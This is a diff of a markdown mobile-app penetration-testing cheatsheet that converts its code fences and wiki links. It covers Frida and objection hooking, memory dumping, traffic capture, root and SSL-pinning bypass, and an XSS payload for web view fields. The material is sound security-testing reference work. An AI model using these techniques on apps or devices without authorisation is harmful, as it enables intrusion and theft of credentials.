-~~~python
+```python
 ###!/usr/bin/env python3
 import argparse
 import sqlite3
@@ -1914,7 +1911,7 @@ def main():
 if __name__ == "__main__":
     main()
 
-~~~
+```
 
 ##### Background Screenshot
 
@@ -1926,9 +1923,9 @@ By default, a screenshot is saved when the application goes into the background:
 
 Monitor cryptographic functions such as encryption, decryption, and hashing as they are executed in real time with `objection`:
 
-~~~shell
+```shell
 ios monitor crypto
-~~~
+```
 
 #### Inter-Process-Communication
 
@@ -1938,9 +1935,9 @@ Check what universal links are allowed by looking for the entitlement `com.apple
 
 Validate Apple App Site Association (AASA) - Universal Links with [yurl](https://github.com/chayev/yurl):
 
-~~~shell
+```shell
 yurl aasa validate <domain>
-~~~
+```
 
 URL schemes are registered in the `Info.plist` in the `CFBundleURLTypes` property.
 
@@ -1948,35 +1945,35 @@ URL schemes are registered in the `Info.plist` in the `CFBundleURLTypes` propert
 
 Enumerate possible Universal Links or app links using URL Schemes:
 
-~~~shell
+```shell
 strings <binary> | grep "://"
-~~~
+```
 
 Open a link on an iOS device (ssh to to device) using `uiopen`:
 
-~~~shell
+```shell
 uiopen <link>
-~~~
+```
 
 Open a link on an iOS simulator:
 
-~~~shell
+```shell
 xcrun simctl openurl booted '<INSERT_URL_HERE>'
-~~~
+```
 
 Trace `openURL` usage with `frida-trace`:
 
-~~~shell
+```shell
 frida-trace -U -m "*[* *openURL*]" -p <app PID>
-~~~
+```
 
 ##### App Extensions
 
 Grep for `NSExtensionPointIdentifier` among all files inside the app bundle (IPA or installed app):
 
-~~~shell
+```shell
 grep -nr NSExtensionPointIdentifier <app folder>
-~~~
+```
 
 
 Look for `NSExtensionActivationRule` property in the `Info.plist`. That key specifies the data being supported as well as e.g. maximum of items supported
@@ -1987,7 +1984,7 @@ Hook `NSExtensionContext - inputItems` in the data originating app.
 
 In web views' form fields, try inject some of these payloads:
 
-~~~html
+```html
 <!-- XSS -->
 <script>alert(1)</script> <!-- or any xss payload -->
 
@@ -1996,36 +1993,36 @@ In web views' form fields, try inject some of these payloads:
 
 <!-- Open Phone App -->
 <a href="tel:+1-847-555-5555">Open phone app</a>
-~~~
+```
 
 #### Memory Analysis
 
 Dump memory with `objection`:
 
-~~~objection
+```objection
 > memory dump all <output directory>
-~~~
+```
 
 Search string in memory with `objection`:
 
-~~~objection
+```objection
 > memory search Password --string
-~~~
+```
 
 Search bytes in memory with `objection`:
 
-~~~objection
+```objection
 > memory search "<space-separated bytes>" 
 
 ### Simple example: "50 61 73 73 77 6f 72 64" // Password
 ### Placeholder example: "50 ?? 73 73 77 ?? ?? 64" //P?ssw??d
-~~~
+```
 
 Dump memory with [fridump3](https://github.com/rootbsd/fridump3):
 
-~~~shell
+```shell
 python3 fridump3.py -u -s -o <output dir>
-~~~
+```
 
 
 #### Network Traffic Analysis
@@ -2034,37 +2031,37 @@ Since iOS 5, devices have included a **Remote Virtual Interface (RVI)** facility
 
 Create a RVI for a connected device with `rvictl`; after running this command a new network interface is added (such as`rvi0`):
 
-~~~shell
+```shell
 rvictl -s <device UDID>
-~~~
+```
 
 The device UDID can be found by using `xcrun`:
 
-~~~shell
+```shell
 xcrun xctrace list devices
 ### OR only booted simulators
 xcrun simctl list | grep "Booted"
-~~~
+```
 
 Capture network traffic with `tcpdump`:
 
-~~~shell
+```shell
 sudo tcpdump -i <rvi interface> -w <outut .pcap>
-~~~
+```
 
 Remove the RVI interface with `rvictl`:
 
-~~~shell
+```shell
 rvictl -x <device UDID>
-~~~
+```
 
 #### Hooking
 
 Trace ObjC methods invocations with `frida-trace`:
 
-~~~shell
+```shell
 frida-trace -U -m "<return type>[<class name> <method name>]" -p <PID>
-~~~
+```
 
 where:
 
@@ -2074,47 +2071,47 @@ where:
 
 Search loaded classes with `objection`:
 
-~~~objection
+```objection
 > ios hooking search classes <keyword>
-~~~
+```
 
 Search loaded methods with `objection`:
 
-~~~objection
+```objection
 > ios hooking search methods <keyword>
-~~~
+```
 
 List Loaded Classes with `objection`:
 
-~~~objection
+```objection
 > ios hooking list classes
-~~~
+```
 
 Explore Methods of a Class with `objection`:
 
-~~~objection
+```objection
 > ios hooking list class_methods <class>
-~~~
+```
 
 Hook all class' methods with `objection`:
 
-~~~objection
+```objection
 > ios hooking watch class "<class name>"
-~~~
+```
 
 Hook Methods with `objection`:
 
-~~~objection
+```objection
 > ios hooking watch method "+[<class> <method>]" --dump-args --dump-return
-~~~
+```
 
 Objection will print out details whenever this method is called during the app’s execution.
 
 Patch a method at runtime with `objection`:
 
-~~~objection
+```objection
 > ios hooking set return_value "+[<class> <method>]" false
-~~~
+```
 
 ### Logging
 
@@ -2125,39 +2122,39 @@ Patch a method at runtime with `objection`:
 
 Use `idevicesyslog`:
 
-~~~shell
+```shell
 brew install libimobiledevice
 idevicesyslog | grep MyApp
-~~~
+```
 
 #### Logging on simulator
 
 Logs are located at:
 
-~~~
+```
 ~/Library/Logs/CoreSimulator/<DEVICE ID>/system.log
-~~~
+```
   
 Where `<DEVICE ID>` can be found on the `Simulator` app.
 
 Alternatively, it's possible to get logs with `xcrun`:
 
-~~~shell
+```shell
 xcrun simctl spawn booted log stream --predicate 'eventMessage contains "<app package>"' --level debug
-~~~
+```
 
 
 ### FAQ
 
 #### 1. IPA crashes without logs on simulator
 
-1. Check that the app is compiled for the correct architecture [[###Check Architecture]]
-2. Check that the app is compiled for simulator [[###Check target build platform]]
-3. Check that the simulator's iOS version is at least the minimum supported OS version [[###Plist content]]
-4. Verify that there are no absolute paths from the building machine in the RPATH [[###Check runtime paths]]
+1. Check that the app is compiled for the correct architecture [Check Architecture](#check-architecture)
+2. Check that the app is compiled for simulator [Check target build platform](#check-target-build-platform)
+3. Check that the simulator's iOS version is at least the minimum supported OS version [Plist content](#plist-content)
+4. Verify that there are no absolute paths from the building machine in the RPATH [Check runtime paths](#check-runtime-paths)
 	1. If some path is found, remove it with the following command: `install_name_tool -delete_rpath "<absolute path>" <appname>.app/<appname>`
 	2. Re-sign the application with following command: `codesign --force --sign - --deep <appname>.app`
-	3. Uninstall and re-install the IPA/APP [[###Install IPA/APP on simulator]]
+	3. Uninstall and re-install the IPA/APP [Install IPA/APP on simulator](#install-ipaapp-on-simulator)
 
 
 #### 2. Objection 
@@ -2186,54 +2183,54 @@ SOLUTION 2 - DOWNGRADE FRIDA ON THE iOS DEVICE
 
 Get iOS device id:
 
-~~~shell
+```shell
 idevice_id
-~~~
+```
 
 Get iOS device info:
 
-~~~shell
+```shell
 ideviceinfo
-~~~
+```
 
 List installed apps:
 
-~~~shell
+```shell
 brew install ideviceinstaller
 ideviceinstaller -l
-~~~
+```
 
 Install IPA:
 
-~~~shell
+```shell
 ideviceinstaller -i <ipa>
-~~~
+```
 
 Uninstall app:
 
-~~~shell
+```shell
 ideviceinstaller --uninstall <app bundle name>
-~~~
+```
 
 Create encrypted backup of the iOS device:
 
-~~~shell
+```shell
 idevicebackup2 encryption on "<password>"
 idevicebackup2 backup --full <output directory>
-~~~
+```
 
 Restore a backup:
 
-~~~shell
+```shell
 idevicebackup2 restore --system --settings --password "<password>" <backup directory>
-~~~
+```
 
 
 Get backup information:
 
-~~~shell
+```shell
 idevicebackup2 info <backup directory>
-~~~
+```
 
 #### MacOS 
 
@@ -2245,9 +2242,9 @@ Keyboard Shortcuts:
 
 Send command output to clipboard:
 
-~~~shell
+```shell
 <command> | pbcopy
-~~~
+```
 ### iOS - Todo
 
 - https://github.com/GhidraEnjoyr/iOS-Reverse-Engineering?tab=readme-ov-file###basics-of-ios
@@ -2268,7 +2265,7 @@ Usually with *frida* you can bypass the SSL pinning using the js scripts, but wi
 
 Pay attention if the app is in Release or Debug mode. Because the name of the .so library is different and will not be found by common tools like *reflutter*.
 
-~~~java
+```java
 @override
 HttpClient createHttpClient(SecurityContext? context) {
 	return super.createHttpClient(context)
@@ -2277,7 +2274,7 @@ HttpClient createHttpClient(SecurityContext? context) {
 		return "PROXY localhost:8080";
 	};
 }
-~~~
+```
 
 The following frida script works fine: [https://github.com/NVISOsecurity/disable-flutter-tls-verification](https://github.com/NVISOsecurity/disable-flutter-tls-verification)
 
@@ -2297,7 +2294,7 @@ References:
 - [https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/](https://blog.nviso.eu/2022/08/18/intercept-flutter-traffic-on-ios-and-android-http-https-dio-pinning/)
 - [https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/)
 
-If [[mobile-cheatsheet#Frida Flutter Proxy|Frida Flutter Proxy]] method does not work, try the following.
+If [Frida Flutter Proxy](#frida-flutter-proxy) method does not work, try the following.
 
 Flutter does not use system proxy configuration and it doesn’t use the system’s certificate store. Therefore, it's not possible to directly intercept the HTTP traffic generated by flutter applications. In order to overcome this problem, try the following solutions (**still requiring SSL pinning bypass**):
 
@@ -2312,9 +2309,9 @@ Another alternative is this script generated with Claude, which merges SSL Pinni
 
 Dump flutter packages, after unpacking the APK:  
 
-~~~shell
+```shell
 strings libapp.so | grep package:
-~~~
+```
 
 ## Frida & Objection
 
@@ -2328,7 +2325,7 @@ Useful Resources:
 
 List processes:
 
-~~~shell
+```shell
 // -U - USB Device
 frida-ps -U
 
@@ -2338,11 +2335,11 @@ frida-ps -Ua
 
 // -i - List all installed applications
 frida-ps -Uai
-~~~
+```
 
 Connect to process:
 
-~~~shell
+```shell
 // Connect by name (-n)
 frida -U -n "<process name>"
 
@@ -2350,29 +2347,29 @@ frida -U -n "<process name>"
 frida -U -f com.jack.ovaasolution
 
 objection --gadget|-g <package name> explore
-~~~
+```
 
 Await for process to spawn:
 
-~~~shell
+```shell
 frida -U -W '<package name>' 
-~~~
+```
 
 Run script:
 
-~~~shell
+```shell
 // Run script on load*
 frida -U -f <package> -l <script> 
 
 // Run script in the attached process
 [frida]-> %exec <script>
-~~~
+```
 
 \*Note: a script attached on load will re-run every time it's modified - REPL mode
 
 Patch APK to inject Frida gadget, for non-rooted devices:
 
-~~~shell
+```shell
 // Get device architecture
 [adb shell] getprop ro.product.cpu.abi
 [adb shell] getprop ro.product.cpu.abilist (alternative)
@@ -2380,29 +2377,29 @@ Patch APK to inject Frida gadget, for non-rooted devices:
 
 objection patchapk --source <apk path> -a <architecture> [--use-aapt2]
 
-~~~
+```
 
 Root bypass:
 
-~~~shell
+```shell
 frida --codeshare dzonerzy/fridantiroot -f <package>
 
 [objection -g <package name> explore -s] "android root disable"
-~~~
+```
 
 List hookable method in class:
 
-~~~shell
+```shell
 objection> android hooking list class_methods <classname>
-~~~
+```
 
 Watch class and class methods invocatations:
 
-~~~shell
+```shell
 objection> android hooking watch class <package.class> [--dump-backtrace --dump-args --dump-return]
 
 objection> android hooking watch class_method <package.class.method> [--dump-backtrace --dump-args --dump-return]
-~~~
+```
 
 Search or write in memory:
 
@@ -2414,7 +2411,7 @@ objection> memory write "<address>" "<pattern eg: 41 41 41 41>" (--string)
 
 Read from and transform to byte array:
 
-~~~javascript
+```javascript
 function fromByteArray(arr){
     let result = "";
     for(let i=0; i < arr.length; i++){
@@ -2431,11 +2428,11 @@ function toByteArray(str){
     }
     return result
 }
-~~~
+```
 
 Attach to method implementation:
 
-~~~javascript
+```javascript
 const func = ObjC.classes[<class>][<method signature>];
 Interceptor.attach(func.implementation,{
     onEnter: function(args){
@@ -2445,11 +2442,11 @@ Interceptor.attach(func.implementation,{
         // do something
     }
 });
-~~~
+```
 
 Attach to native functions:
 
-~~~javascript
+```javascript
 Interceptor.attach(Module.findExportByName("<native lib>", "<function>"), {
     onEnter: function (args) {        
 	    // Set a custom property
@@ -2463,12 +2460,12 @@ Interceptor.attach(Module.findExportByName("<native lib>", "<function>"), {
 	    }
     }
 });
-~~~
+```
 
 
 Replace native function implementation:
 
-~~~javascript
+```javascript
 const strstrPtr = Module.getExportByName('libc.so', 'strstr');
     const strstr = new NativeFunction(strstrPtr, 'pointer', ['pointer', 'pointer']);
     Interceptor.replace(strstrPtr, new NativeCallback((haystack, needle) => {
@@ -2482,11 +2479,11 @@ const strstrPtr = Module.getExportByName('libc.so', 'strstr');
         return new NativePointer(res);
 
     }, 'pointer', ['pointer', 'pointer']));
-~~~
+```
 
 Attach to all exported functions of a module:
 
-~~~javascript
+```javascript
 const lib = "libfoo.so";
 Module.enumerateExportsSync(lib).map((x) => {
         if (x.type == "function") {
@@ -2501,11 +2498,11 @@ Module.enumerateExportsSync(lib).map((x) => {
             });
         }
     });
-~~~
+```
 
 Attach to module internal function (not exported):
 
-~~~javascript
+```javascript
 const offset = 0x00000fa0; // from radare2 or Ghidra (for Ghidra see this: https://stackoverflow.com/questions/68332781/frida-hook-native-non-exported-functions)
 const baseAddress = Module.getBaseAddress(<module name>);
 Interceptor.attach(baseAddress.add(offset), {
@@ -2532,11 +2529,11 @@ Interceptor.attach(baseAddress.add(offset), {
 		}));
 	}
 });
-~~~
+```
 
 Scan memory for pattern:
 
-~~~javascript
+```javascript
  const flagLib = Process.getModuleByName("libflag.so");
         const res = Memory.scanSync(flagLib.base, flagLib.size, "4d 48 4c 7b"); // Search for MHL{
         if (res.length > 0) {
@@ -2549,13 +2546,13 @@ Scan memory for pattern:
                 
             });
         }
-~~~
+```
 
 It's possible to use "?" as placeholder.
 
 Attach to an Objective-C class' instance method:
 
-~~~javascript
+```javascript
 if (ObjC.available) {
     var targetClass = ObjC.classes['<target class>'];
 
@@ -2566,11 +2563,11 @@ if (ObjC.available) {
     });
 }
 
-~~~
+```
 
 Invoke class instance method - iOS:
 
-~~~javascript
+```javascript
 ObjC.choose(ObjC.classes['Captain_Nohook.ViewController'],{
     onMatch: (instance) => {
         console.log("[!]Flag is: " + instance['- flag']().text())
@@ -2579,35 +2576,35 @@ ObjC.choose(ObjC.classes['Captain_Nohook.ViewController'],{
         // Do nothing
     }
 })
-~~~
+```
 
 Invoke class instance method - Android: https://alyagomaa.github.io/blog/Using-Frida-to-call-unused-android-methods/
 
 For iOS, function arguments start from index 2 and can be processed as follows:
 
-~~~javascript
+```javascript
 onEnter: function(args){
  console.log("[>] Arguments: " + new ObjC.Object(args[2]));;
 },
-~~~
+```
 
 Initialise a `NSString` object:
 
-~~~javascript
+```javascript
 var nsstring = ObjC.classes.NSString.stringWithString_("rickfromfrida");
-~~~
+```
 
 `UIKit` code must be ran on the main thread in order to properly work. The following snippet allows to queue function on the main thread queue:
 
-~~~javascript
+```javascript
 ObjC.schedule(ObjC.mainQueue, function () {
     // <-- All UIKit code goes here
 });
-~~~
+```
 
 Close keyboard (globally) - from ChaptGPT:
 
-~~~ javascript
+```javascript
 function closeKeyboard(){
     ObjC.schedule(ObjC.mainQueue, function () {
        const app = ObjC.classes.UIApplication.sharedApplication();
@@ -2616,11 +2613,11 @@ function closeKeyboard(){
        app.sendAction_to_from_forEvent_(sel, null, null, null);       
     })
 }
-~~~
+```
 
 Close keyboard (globally) invoking `- endEditing:YES`:
 
-~~~javascript
+```javascript
 function closeKeyboard(f=null){
     let controllers = Object.keys(ObjC.classes);
     if(f != null){
@@ -2641,11 +2638,11 @@ function closeKeyboard(f=null){
         })
     })
 }
-~~~
+```
 
 Close keyboard in specific view invoking `- endEditing:YES` (for iOS):
 
-~~~javascript
+```javascript
 const controller = ObjC.classes['<controller class name>']
 
 ObjC.choose(controller,{
@@ -2658,11 +2655,11 @@ ObjC.choose(controller,{
 		// Do nothing
 	}
 })
-~~~
+```
 
 Dump `char *arr[]` (array of char pointers):
 
-~~~javascript
+```javascript
 const readString = Memory.readUtf8String;
 function dumpCharPointerArray(arrayPtr){
     var values = [];
@@ -2678,11 +2675,11 @@ function dumpCharPointerArray(arrayPtr){
     }
     return values
 }
-~~~
+```
 
 Hook `posix_spawn` (based on [frida-launchd-spawn.js](https://gist.github.com/trufae/06cd2a4a5e2b1b4ad1a30e5b72d4d2c5)):
 
-~~~javascript
+```javascript
 Interceptor.attach(Module.findExportByName('/usr/lib/system/libsystem_kernel.dylib', 'posix_spawn'), {
     onEnter: function (args) {
 
@@ -2707,4 +2704,4 @@ Interceptor.attach(Module.findExportByName('/usr/lib/system/libsystem_kernel.dyl
   onLeave: function (ret) {
   }
 });
-~~~
+```
